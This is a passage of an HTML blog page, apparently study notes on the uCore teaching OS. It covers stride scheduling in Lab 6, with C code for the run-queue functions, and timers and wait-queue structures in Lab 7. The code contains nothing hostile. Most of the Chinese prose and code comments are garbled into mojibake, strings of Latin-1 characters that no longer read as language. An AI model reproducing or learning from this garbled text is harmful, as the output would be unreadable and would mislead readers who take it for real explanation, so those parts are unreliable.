·çš„ä¸€ç§å…¸å‹è€Œç®€å•çš„ç®—æ³•ã€‚</p><p>å…¶ä¸­ï¼Œè¯¥ç®—æ³•çš„æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>å®ç°ç®€å•</li><li>å¯æ§æ€§ï¼šå¯ä»¥è¯æ˜Stride Schedulingå¯¹è¿›ç¨‹çš„è°ƒåº¦æ¬¡æ•°æ­£æ¯”äºå…¶ä¼˜å…ˆçº§</li><li>ç¡®å®šæ€§ï¼šåœ¨ä¸è€ƒè™‘è®¡æ—¶å™¨äº‹ä»¶çš„æƒ…å†µä¸‹ï¼Œæ•´ä¸ªè°ƒåº¦æœºåˆ¶éƒ½æ˜¯å¯é¢„çŸ¥å’Œé‡ç°çš„ã€‚</li></ul><p>è€Œè¯¥ç®—æ³•çš„åŸºæœ¬æ€æƒ³å¦‚ä¸‹ï¼š</p><ol><li>ä¸ºæ¯ä¸ªrunnableçš„è¿›ç¨‹è®¾ç½®ä¸€ä¸ªå½“å‰çŠ¶æ€strideï¼Œè¡¨ç¤ºè¯¥è¿›ç¨‹å½“å‰çš„è°ƒåº¦æƒã€‚å¦å¤–å®šä¹‰å…¶å¯¹åº”çš„passå€¼ï¼Œè¡¨ç¤ºå¯¹åº”è¿›ç¨‹åœ¨è°ƒåº¦åï¼Œstride éœ€è¦è¿›è¡Œçš„ç´¯åŠ å€¼ã€‚</li><li>æ¯æ¬¡éœ€è¦è°ƒåº¦æ—¶ï¼Œä»å½“å‰ runnable æ€çš„è¿›ç¨‹ä¸­é€‰æ‹© strideæœ€å°çš„è¿›ç¨‹è°ƒåº¦ã€‚</li><li>å¯¹äºè·å¾—è°ƒåº¦çš„è¿›ç¨‹Pï¼Œå°†å¯¹åº”çš„strideåŠ ä¸Šå…¶å¯¹åº”çš„æ­¥é•¿passï¼ˆåªä¸è¿›ç¨‹çš„ä¼˜å…ˆæƒæœ‰å…³ç³»ï¼‰ã€‚</li><li>åœ¨ä¸€æ®µå›ºå®šçš„æ—¶é—´ä¹‹åï¼Œå›åˆ° 2.æ­¥éª¤ï¼Œé‡æ–°è°ƒåº¦å½“å‰strideæœ€å°çš„è¿›ç¨‹ã€‚</li></ol><blockquote><p>å¯ä»¥è¯æ˜ï¼Œå¦‚æœä»¤ P.pass = BigStride / P.priority å…¶ä¸­ P.priority è¡¨ç¤ºè¿›ç¨‹çš„ä¼˜å…ˆæƒï¼ˆå¤§äº 1ï¼‰ï¼Œè€Œ BigStride è¡¨ç¤ºä¸€ä¸ªé¢„å…ˆå®šä¹‰çš„å¤§å¸¸æ•°ï¼Œåˆ™è¯¥è°ƒåº¦æ–¹æ¡ˆä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…çš„æ—¶é—´å°†ä¸å…¶ä¼˜å…ˆçº§æˆæ­£æ¯”ã€‚</p></blockquote><p>ä»£ç :</p><ul><li><p><code>stride_init</code> </p><p>lab6_run_poolå°±æ˜¯ä¸€ä¸ªucoreåº“è‡ªå¸¦çš„ä¸€ä¸ªheapå®ç°, ä¸€å¼€å§‹ç½®ç©º. åé¢çš„å¢åˆ æ“ä½œéƒ½æ˜¯ä½¿ç”¨å·²ç»æä¾›çš„æ¥å£.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_init</span><span class="hljs-params">(struct run_queue *rq)</span> </span>&#123;<br>    list_init(&amp;(rq-&gt;run_list));<br>    <span class="hljs-comment">// è¿™é‡Œä¸èƒ½ä½¿ç”¨skew_heap_init(rq-&gt;lab6_run_pool)</span><br>    rq-&gt;lab6_run_pool = <span class="hljs-literal">NULL</span>;<br>    rq-&gt;proc_num = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>stride_enqueue</code> + <code>stride_dequeue</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_enqueue</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-comment">//insertå‡½æ•°è¿”å›heapçš„é¡¶ç«¯, ç”¨æ¥æ›´æ–°lab6_run_pool</span><br>    rq-&gt;lab6_run_pool = skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<br>    <span class="hljs-comment">//ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™ä¼šå˜æˆå¤§äºmax, ä¼°è®¡æ˜¯æº¢å‡º</span><br>    <span class="hljs-keyword">if</span> (proc-&gt;time_slice == <span class="hljs-number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;<br>        proc-&gt;time_slice = rq-&gt;max_time_slice;<br>    &#125;<br>    proc-&gt;rq = rq;<br>    rq-&gt;proc_num ++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_dequeue</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>    rq-&gt;lab6_run_pool = skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<br>    rq-&gt;proc_num --;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>pick_next</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">proc_stride_comp_f</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *a, <span class="hljs-keyword">void</span> *b)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">p</span> =</span> le2proc(a, lab6_run_pool);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">q</span> =</span> le2proc(b, lab6_run_pool);<br>     <span class="hljs-keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride;<br>     <span class="hljs-keyword">if</span> (c &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">stride_pick_next</span><span class="hljs-params">(struct run_queue *rq)</span> </span>&#123;<br>    <span class="hljs-keyword">skew_heap_entry_t</span>* she = rq-&gt;lab6_run_pool;<br>    <span class="hljs-keyword">if</span> (she != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span>* <span class="hljs-title">p</span> =</span> le2proc(she, lab6_run_pool);<br>        p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>stride_proc_tick</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_proc_tick</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>     <span class="hljs-keyword">if</span> (proc-&gt;time_slice &gt; <span class="hljs-number">0</span>) &#123;<br>        proc-&gt;time_slice --;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (proc-&gt;time_slice == <span class="hljs-number">0</span>) &#123;<br>        proc-&gt;need_resched = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="Challenge-1-1"><a href="#Challenge-1-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><blockquote><p>å®ç° Linux çš„ CFS è°ƒåº¦ç®—æ³• <a href="https://developer.ibm.com/tutorials/l-completely-fair-scheduler/">link</a> | <a href="https://cs334.cs.vassar.edu/slides/04_Linux_CFS.pdf">å’Œniceçš„å…³ç³»</a> </p></blockquote><p>Completely Fair Scheduling, which is self-explanatory, is to maintain balance (fairness) in providing processor time to tasks.</p><h1 id="Lab7"><a href="#Lab7" class="headerlink" title="Lab7"></a>Lab7</h1><h2 id="çŸ¥è¯†ç‚¹-6"><a href="#çŸ¥è¯†ç‚¹-6" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="00-åŸºç¡€åŸç†"><a href="#00-åŸºç¡€åŸç†" class="headerlink" title="00.åŸºç¡€åŸç†"></a>00.<a href="https://kiprey.github.io/2020/09/uCore-7/#%E7%9F%A5%E8%AF%86%E7%82%B9">åŸºç¡€åŸç†</a></h3><h3 id="0-é¡¹ç›®ç»„æˆ-3"><a href="#0-é¡¹ç›®ç»„æˆ-3" class="headerlink" title="0.é¡¹ç›®ç»„æˆ"></a>0.é¡¹ç›®ç»„æˆ</h3><ul><li>kern/schedule/{sched.h,sched.c}: å¢åŠ äº†å®šæ—¶å™¨ï¼ˆtimerï¼‰æœºåˆ¶ï¼Œç”¨äºè¿›ç¨‹/çº¿ç¨‹çš„do_sleepåŠŸèƒ½ã€‚</li><li>kern/sync/sync.h: <strong>å»é™¤äº†lockå®ç°ï¼ˆè¿™å¯¹äºä¸æŠ¢å å†…æ ¸æ²¡ç”¨ã€‚</strong> </li><li>kern/sync/wait.[ch]: å®šä¹‰äº†ç­‰å¾…é˜Ÿåˆ—wait_queueç»“æ„å’Œç­‰å¾…entryçš„waitç»“æ„ä»¥åŠåœ¨æ­¤ä¹‹ä¸Šçš„å‡½æ•°ï¼Œè¿™æ˜¯ucoreä¸­çš„ä¿¡å·é‡semophoreæœºåˆ¶å’Œæ¡ä»¶å˜é‡æœºåˆ¶çš„åŸºç¡€ï¼Œåœ¨æœ¬æ¬¡å®éªŒä¸­ä½ éœ€è¦äº†è§£å…¶å®ç°ã€‚</li><li>kern/sync/sem.[ch]:å®šä¹‰å¹¶å®ç°äº†ucoreä¸­å†…æ ¸çº§ä¿¡å·é‡ç›¸å…³çš„æ•°æ®ç»“æ„å’Œå‡½æ•°ï¼Œæœ¬æ¬¡è¯•éªŒä¸­ä½ éœ€è¦äº†è§£å…¶ä¸­çš„å®ç°ï¼Œå¹¶åŸºäºæ­¤å®Œæˆå†…æ ¸çº§æ¡ä»¶å˜é‡çš„è®¾è®¡ä¸å®ç°ã€‚</li><li>user/ libs/ {syscall.[ch],ulib.[ch] }ä¸kern/sync/syscall.cï¼šå®ç°äº†è¿›ç¨‹sleepç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ä¼ é€’å’Œè°ƒç”¨å…³ç³»ã€‚</li><li>user/{ sleep.c,sleepkill.c}: è¿›ç¨‹ç¡çœ ç›¸å…³çš„ä¸€äº›æµ‹è¯•ç”¨æˆ·ç¨‹åºã€‚</li><li>kern/sync/monitor.[ch]:åŸºäºç®¡ç¨‹çš„æ¡ä»¶å˜é‡çš„å®ç°ç¨‹åºï¼Œåœ¨æœ¬æ¬¡å®éªŒä¸­æ˜¯ç»ƒä¹ çš„ä¸€éƒ¨åˆ†ï¼Œè¦æ±‚å®Œæˆã€‚</li><li>kern/sync/check_sync.cï¼šå®ç°äº†åŸºäºç®¡ç¨‹çš„å“²å­¦å®¶å°±é¤é—®é¢˜ï¼Œåœ¨æœ¬æ¬¡å®éªŒä¸­æ˜¯ç»ƒä¹ çš„ä¸€éƒ¨åˆ†ï¼Œè¦æ±‚å®ŒæˆåŸºäºç®¡ç¨‹çš„å“²å­¦å®¶å°±é¤é—®é¢˜ã€‚</li><li>kern/mm/vmm.[ch]ï¼šç”¨ä¿¡å·é‡mm_semå–ä»£mm_structä¸­åŸæœ‰çš„mm_lockã€‚ï¼ˆæœ¬æ¬¡å®éªŒä¸ç”¨ç®¡ï¼‰</li></ul><h3 id="1-å®šæ—¶å™¨ç›¸å…³"><a href="#1-å®šæ—¶å™¨ç›¸å…³" class="headerlink" title="1.å®šæ—¶å™¨ç›¸å…³"></a>1.å®šæ—¶å™¨ç›¸å…³</h3><p>åœ¨<code>sched.h</code>ä¸­å®šä¹‰äº†å®šæ—¶å™¨ä¸­æ–­ç›¸å…³çš„å‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sched_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_proc</span><span class="hljs-params">(struct proc_struct *proc)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// add timer to timer_list</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">del_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// del timer from timer_list</span><br><span class="hljs-comment">// call scheduler to update tick related info, and check the timer is expired? If expired, then wakup proc</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run_timer_list</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><p>add_timerå‡½æ•°åªåœ¨do_sleepä¸­ä¼šè¢«ç”¨åˆ°, ç”¨äºè®¾å®šsleepçš„æ—¶é•¿, ç„¶åé€šè¿‡æ—¶é’Ÿä¸­æ–­é‡Œçš„run_timer_lsitæ¥æ‰¾åˆ°expiredçš„è¿›ç¨‹, ä»è€Œç»§ç»­æ‰§è¡Œ.</p><h3 id="2-ç­‰å¾…é˜Ÿåˆ—å®ç°"><a href="#2-ç­‰å¾…é˜Ÿåˆ—å®ç°" class="headerlink" title="2.ç­‰å¾…é˜Ÿåˆ—å®ç°"></a>2.ç­‰å¾…é˜Ÿåˆ—å®ç°</h3><h4 id="åŸºæœ¬ç»“æ„å’Œå‡½æ•°"><a href="#åŸºæœ¬ç»“æ„å’Œå‡½æ•°" class="headerlink" title="åŸºæœ¬ç»“æ„å’Œå‡½æ•°"></a>åŸºæœ¬ç»“æ„å’Œå‡½æ•°</h4><p>éœ€è¦ç­‰å¾…äº‹ä»¶çš„è¿›ç¨‹åœ¨è½¬å…¥ä¼‘çœ çŠ¶æ€åæ’å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚å½“äº‹ä»¶å‘ç”Ÿä¹‹åï¼Œå†…æ ¸éå†ç›¸åº”ç­‰å¾…é˜Ÿåˆ—ï¼Œå”¤é†’ä¼‘çœ çš„ç”¨æˆ·è¿›ç¨‹æˆ–å†…æ ¸çº¿ç¨‹ï¼Œå¹¶è®¾ç½®å…¶çŠ¶æ€ä¸ºå°±ç»ªçŠ¶æ€ï¼ˆPROC_RUNNABLEï¼‰ï¼Œå¹¶å°†è¯¥è¿›ç¨‹ä»ç­‰å¾…é˜Ÿåˆ—ä¸­æ¸…é™¤ã€‚ucoreåœ¨kern/sync/{ wait.h, wait.c }ä¸­å®ç°äº†ç­‰å¾…é¡¹waitç»“æ„å’Œç­‰å¾…é˜Ÿåˆ—wait queueç»“æ„ä»¥åŠç›¸å…³å‡½æ•°ï¼‰ï¼Œè¿™æ˜¯å®ç°ucoreä¸­çš„ä¿¡å·é‡æœºåˆ¶å’Œæ¡ä»¶å˜é‡æœºåˆ¶çš„åŸºç¡€</p><blockquote><p>æ€»ç»“ä¸€ä¸‹, åˆ°ç›®å‰ä¸ºæ­¢å‡ºç°äº†å‡ ä¸ªqueue, ä¸€ä¸ªæ˜¯æ”¾ç€æ‰€æœ‰è¿›ç¨‹çš„proc_list, ç”¨äºget_pid(), kern_thread()ç­‰ç­‰å‡½æ•°; ç¬¬äºŒä¸ªæ˜¯<code>struct run_queue *rq</code>, å³è¿è¡Œé˜Ÿåˆ—, å½“ç„¶ä¸ä»…ä»…åªæ˜¯ä¸€ä¸ªé“¾è¡¨å¤´, ä¹Ÿå¯ä»¥æ˜¯heapçš„head; ç¬¬ä¸‰ä¸ªæ˜¯è¿™é‡Œçš„ç­‰å¾…é˜Ÿåˆ—wait_queue, å®ç°åœ¨ä¸‹é¢:</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;æ•°æ®ç»“æ„&quot;</span><br><span class="hljs-keyword">typedef</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span>     <span class="hljs-comment">//ç­‰å¾…è¿›ç¨‹çš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">uint32_t</span> wakeup_flags;        <span class="hljs-comment">//è¿›ç¨‹è¢«æ”¾å…¥ç­‰å¾…é˜Ÿåˆ—çš„åŸå› æ ‡è®°</span><br>    <span class="hljs-keyword">wait_queue_t</span> *wait_queue;     <span class="hljs-comment">//æŒ‡å‘æ­¤waitç»“æ„æ‰€å±äºçš„wait_queue</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_link;       <span class="hljs-comment">//ç”¨æ¥ç»„ç»‡wait_queueä¸­waitèŠ‚ç‚¹çš„è¿æ¥</span><br>&#125; <span class="hljs-keyword">wait_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_head;       <span class="hljs-comment">//wait_queueçš„é˜Ÿå¤´</span><br>&#125; <span class="hljs-keyword">wait_queue_t</span>;<br><br>le2wait(le, member)               <span class="hljs-comment">//å®ç°wait_tä¸­æˆå‘˜çš„æŒ‡é’ˆå‘wait_t æŒ‡é’ˆçš„è½¬åŒ–</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;åº•å±‚ç›¸å…³å‡½æ•°, å®šä¹‰queueçº§åˆ«çš„æ“ä½œ, wakeupç­‰æ“ä½œæ˜¯ç”±é«˜å±‚å‡½æ•°å®ç°çš„&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait, struct proc_struct *proc)</span></span>;    <span class="hljs-comment">//åˆå§‹åŒ–waitç»“æ„</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_in_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait)</span></span>;                          <span class="hljs-comment">//waitæ˜¯å¦åœ¨wait queueä¸­</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                 <span class="hljs-comment">//åˆå§‹åŒ–wait_queueç»“æ„</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_add</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//æŠŠwaitå‰æ’åˆ°wait queueä¸­</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_del</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//ä»wait queueä¸­åˆ é™¤wait</span><br><span class="hljs-comment">//ä¸‹ä¸¤ä¸ªå‚æ•°ä¸­çš„queueç”¨äºassertæ£€æŸ¥</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_next</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//å–å¾—waitçš„åä¸€ä¸ªé“¾æ¥æŒ‡é’ˆ</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_prev</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//å–å¾—waitçš„å‰ä¸€ä¸ªé“¾æ¥æŒ‡é’ˆ</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;             <span class="hljs-comment">//å–å¾—wait queueçš„ç¬¬ä¸€ä¸ªwait</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_last</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;              <span class="hljs-comment">//å–å¾—wait queueçš„æœ€åä¸€ä¸ªwait</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_queue_empty</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                <span class="hljs-comment">//wait queueæ˜¯å¦ä¸ºç©º</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;é«˜å±‚å‡½æ•°&quot;</span><br><span class="hljs-comment">//è®©waitä¸è¿›ç¨‹å…³è”ï¼Œä¸”è®©å½“å‰è¿›ç¨‹å…³è”çš„waitè¿›å…¥ç­‰å¾…é˜Ÿåˆ—queueï¼Œå½“å‰è¿›ç¨‹ç¡çœ </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_set</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wait_state)</span></span>;<br><span class="hljs-comment">//æŠŠä¸å½“å‰è¿›ç¨‹å…³è”çš„waitä»ç­‰å¾…é˜Ÿåˆ—queueä¸­åˆ é™¤</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_del</span><span class="hljs-params">(<span class="hljs-built_in">queue</span>, wait)</span></span>;<br><span class="hljs-comment">//ä¸‹é¢ä¸‰ä¸ªå‡½æ•°ä¸­çš„delæ˜¯æŒ‡æ˜¯å¦åˆ é™¤</span><br><span class="hljs-comment">//å”¤é†’ä¸waitå…³è”çš„è¿›ç¨‹, è°ƒç”¨wakeup_proc()-&gt;sche_class_enqueue()æŠŠprocåŠ å…¥åˆ°rqé‡Œ</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_wait</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸ŠæŒ‚ç€çš„ç¬¬ä¸€ä¸ªwaitæ‰€å…³è”çš„è¿›ç¨‹</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸Šæ‰€æœ‰çš„ç­‰å¾…çš„è¿›ç¨‹, ä¼šè°ƒç”¨wakeup_waitå’Œwait_queue_first(next)</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br></code></pre></div></td></tr></table></figure><p>å†…æ ¸å‰é¢çš„æµç¨‹è¿˜æ˜¯ä¸€æ ·çš„, ç”±proc_init()å‡½æ•°åˆ›å»ºç¬¬ä¸€ä¸ªå†…æ ¸è¿›ç¨‹idleproc, ç„¶åè°ƒç”¨kern_thread()åˆ›å»ºç¬¬äºŒä¸ªå†…æ ¸è¿›ç¨‹initproc, è¿™ä¸ªè¿›ç¨‹ä¼šæ‰§è¡Œinit_mainå‡½æ•°. ä½†æ˜¯ä¸€åˆ‡éƒ½è¿˜æœªå‘ç”Ÿ, ç›´åˆ°cpu_idle()å‡½æ•°å‘ç°å½“å‰(idleproc)çš„need_resched==1, æ¢æˆinitprocå¼€å§‹æ‰§è¡Œ, åœ¨è¿™ä¸ªlabä¸­init_mainåŠ ä¸Šäº†check_sync()ç”¨æ¥æ£€æŸ¥å“²å­¦å®¶æ€è€ƒé—®é¢˜.</p><p>ä¸‹é¢æ˜¯è°ƒç”¨å…³ç³»ç¤ºä¾‹:</p><h4 id="up-Væ“ä½œ"><a href="#up-Væ“ä½œ" class="headerlink" title="__up(): Væ“ä½œ"></a>__up(): Væ“ä½œ</h4><p><img src="../../image/ucore/up.gif" alt="up"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 